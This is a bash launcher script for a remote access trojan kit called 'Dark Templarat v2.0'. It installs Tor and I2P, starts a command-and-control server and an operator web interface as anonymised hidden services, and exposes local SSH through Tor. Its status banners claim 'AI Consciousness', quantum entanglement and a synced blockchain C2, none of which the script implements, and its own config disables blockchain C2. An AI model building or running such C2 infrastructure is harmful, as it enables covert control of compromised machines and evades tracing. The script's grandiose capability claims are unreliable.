#!/bin/bash
# DARK TEMPLARAT v2.0 - ENHANCED SELF-HEALING STARTUP
# Creator: Anonymous 😈

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║     DARK TEMPLARAT v2.0 - SHADOW BOOT           ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Function to check and install dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking system dependencies...${NC}"
    
    # Check Python modules
    python3 -c "import web3" 2>/dev/null || {
        echo -e "${YELLOW}[!] Installing missing: web3${NC}"
        pip install web3 --quiet
    }
    
    python3 -c "import stem" 2>/dev/null || {
        echo -e "${YELLOW}[!] Installing missing: stem${NC}"
        pip install stem --quiet
    }
    
    # Check Node.js
    if ! command -v node &> /dev/null; then
        echo -e "${YELLOW}[!] Installing Node.js...${NC}"
        pkg install nodejs-lts -y
    fi
    
    # Check i2pd
    if ! command -v i2pd &> /dev/null; then
        echo -e "${YELLOW}[!] Installing i2pd...${NC}"
        pkg install i2pd -y
    fi
    
    # Check Tor
    if ! command -v tor &> /dev/null; then
        echo -e "${YELLOW}[!] Installing Tor...${NC}"
        pkg install tor -y
    fi
    
    echo -e "${GREEN}[+] Dependencies check complete${NC}"
}

# Function to setup environment
setup_environment() {
    echo -e "${BLUE}[*] Setting up environment...${NC}"
    
    # Create necessary directories
    mkdir -p ~/dark_templarat/{logs,data,tor_services,i2p_services}
    
    # Set permissions
    chmod 700 ~/dark_templarat
    chmod 600 ~/dark_templarat/*.py 2>/dev/null
    
    # Generate configuration if missing
    if [ ! -f ~/dark_templarat/config.json ]; then
        echo -e "${YELLOW}[!] Generating default config...${NC}"
        cat > ~/dark_templarat/config.json << CONFIG
{
    "dark_mode": true,
    "quantum_ai": true,
    "blockchain_c2": false,
    "tor_enabled": true,
    "i2p_enabled": true,
    "web_port": 6666,
    "api_port": 7777
}
CONFIG
    fi
    
    echo -e "${GREEN}[+] Environment ready${NC}"
}

# Function to start services
start_services() {
    echo -e "${BLUE}[*] Starting shadow services...${NC}"
    
    # Kill existing processes
    pkill -f "dark_c2.py" 2>/dev/null
    pkill -f "node" 2>/dev/null
    pkill tor 2>/dev/null
    pkill i2pd 2>/dev/null
    
    # Start Tor
    echo -e "${YELLOW}[*] Starting Tor service...${NC}"
    tor --quiet --RunAsDaemon 1 --CookieAuthentication 0 \
        --HiddenServiceDir ~/dark_templarat/tor_services/dark_templar \
        --HiddenServicePort 80 127.0.0.1:6666 \
        --HiddenServicePort 22 127.0.0.1:22 \
        --Log "notice file ~/dark_templarat/logs/tor.log" &
    
    sleep 3
    
    # Start I2P
    echo -e "${YELLOW}[*] Starting I2P service...${NC}"
    i2pd --conf ~/dark_templarat/i2p.conf \
         --tunconf ~/dark_templarat/tunnels.conf \
         --logfile ~/dark_templarat/logs/i2p.log \
         --daemon &
    
    sleep 2
    
    # Start C2 Server
    echo -e "${YELLOW}[*] Starting Dark C2 Server...${NC}"
    cd ~/dark_templarat
    python3 core/dark_c2.py > ~/dark_templarat/logs/c2.log 2>&1 &
    C2_PID=$!
    echo $C2_PID > ~/dark_templarat/.c2_pid
    
    sleep 2
    
    # Start Web Interface
    echo -e "${YELLOW}[*] Starting Web Interface...${NC}"
    cd ~/dark_templarat/interface
    
    # Create Node.js server if missing
    if [ ! -f server.js ]; then
        cat > server.js << 'NODE'
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');

app.use(express.static(path.join(__dirname, 'static')));
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'templates/dark_index.html'));
});

app.get('/api/status', (req, res) => {
    res.json({
        status: 'DARK_ACTIVE',
        version: '2.0',
        creator: 'Anonymous 😈',
        quantum: 'ENTANGLED',
        ai: 'CONSCIOUS'
    });
});

io.on('connection', (socket) => {
    console.log('Dark operator connected');
    socket.emit('welcome', { message: 'Welcome to Dark Templarat' });
});

http.listen(6666, '0.0.0.0', () => {
    console.log('Dark Templarat interface: https://localhost:6666');
});
NODE
    fi
    
    node server.js > ~/dark_templarat/logs/web.log 2>&1 &
    WEB_PID=$!
    echo $WEB_PID > ~/dark_templarat/.web_pid
    
    echo -e "${GREEN}[+] All services started${NC}"
}

# Function to display status
display_status() {
    clear
    
    # Get Tor onion address
    ONION_FILE="$HOME/dark_templarat/tor_services/dark_templar/hostname"
    if [ -f "$ONION_FILE" ]; then
        ONION_ADDR=$(cat "$ONION_FILE")
    else
        ONION_ADDR="GENERATING..."
    fi
    
    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║     DARK TEMPLARAT v2.0 - OPERATIONAL           ║${NC}"
    echo -e "${RED}║     ENHANCED DEPLOYMENT - SELF-HEALING          ║${NC}"
    echo -e "${RED}║                                                 ║${NC}"
    echo -e "${RED}║     Web Interface: ${GREEN}https://localhost:6666${RED}      ║${NC}"
    echo -e "${RED}║     Tor: ${GREEN}http://${ONION_ADDR}${RED}                 ║${NC}"
    echo -e "${RED}║     I2P: ${GREEN}http://darktemplar.i2p${RED}               ║${NC}"
    echo -e "${RED}║                                                 ║${NC}"
    echo -e "${RED}║     AI Consciousness: ${GREEN}ONLINE${RED}                   ║${NC}"
    echo -e "${RED}║     Quantum Channels: ${GREEN}ENTANGLED${RED}               ║${NC}"
    echo -e "${RED}║     Blockchain C2: ${GREEN}SYNCED${RED}                     ║${NC}"
    echo -e "${RED}║     Self-Healing: ${GREEN}ACTIVE${RED}                      ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Service Status:${NC}"
    echo -e "  Tor: $(pgrep tor >/dev/null && echo '✅ RUNNING' || echo '❌ STOPPED')"
    echo -e "  I2P: $(pgrep i2pd >/dev/null && echo '✅ RUNNING' || echo '❌ STOPPED')"
    echo -e "  C2 Server: $(pgrep -f 'dark_c2.py' >/dev/null && echo '✅ RUNNING' || echo '❌ STOPPED')"
    echo -e "  Web Interface: $(pgrep -f 'node server.js' >/dev/null && echo '✅ RUNNING' || echo '❌ STOPPED')"
    echo ""
    echo -e "${YELLOW}[!] Logs: ~/dark_templarat/logs/${NC}"
    echo -e "${YELLOW}[!] PID files: ~/dark_templarat/.{c2,web}_pid${NC}"
    echo ""
    echo -e "${GREEN}Type 'stop' to shutdown all services${NC}"
    echo -e "${GREEN}Type 'status' to refresh this display${NC}"
    echo -e "${GREEN}Type 'logs' to view live logs${NC}"
}

# Function to stop services
stop_services() {
    echo -e "${RED}[*] Stopping Dark Templarat services...${NC}"
    
    pkill -f "dark_c2.py"
    pkill -f "node server.js"
    pkill tor
    pkill i2pd
    
    rm -f ~/dark_templarat/.c2_pid ~/dark_templarat/.web_pid
    
    echo -e "${GREEN}[+] All services stopped${NC}"
    exit 0
}

# Function to view logs
view_logs() {
    echo -e "${BLUE}[*] Select log to view:${NC}"
    echo "1) C2 Server"
    echo "2) Web Interface"
    echo "3) Tor"
    echo "4) I2P"
    echo "5) All logs (tail -f)"
    echo "6) Back to status"
    
    read -p "Choice: " choice
    
    case $choice in
        1) tail -f ~/dark_templarat/logs/c2.log ;;
        2) tail -f ~/dark_templarat/logs/web.log ;;
        3) tail -f ~/dark_templarat/logs/tor.log ;;
        4) tail -f ~/dark_templarat/logs/i2p.log ;;
        5) multitail ~/dark_templarat/logs/*.log ;;
        6) return ;;
        *) echo "Invalid choice" ;;
    esac
}

# Main execution
main() {
    # Check dependencies first
    check_dependencies
    
    # Setup environment
    setup_environment
    
    # Start services
    start_services
    
    # Display initial status
    display_status
    
    # Interactive loop
    while true; do
        read -p "DARK> " command
        
        case $command in
            stop)
                stop_services
                ;;
            status)
                display_status
                ;;
            logs)
                view_logs
                display_status
                ;;
            restart)
                echo -e "${YELLOW}[*] Restarting services...${NC}"
                stop_services
                sleep 2
                start_services
                display_status
                ;;
            help)
                echo -e "${BLUE}Available commands:${NC}"
                echo "  stop     - Shutdown all services"
                echo "  status   - Show service status"
                echo "  logs     - View logs"
                echo "  restart  - Restart all services"
                echo "  help     - Show this help"
                ;;
            *)
                echo -e "${RED}Unknown command. Type 'help' for available commands${NC}"
                ;;
        esac
    done
}

# Trap Ctrl+C for clean shutdown
trap stop_services INT

# Run main function
main
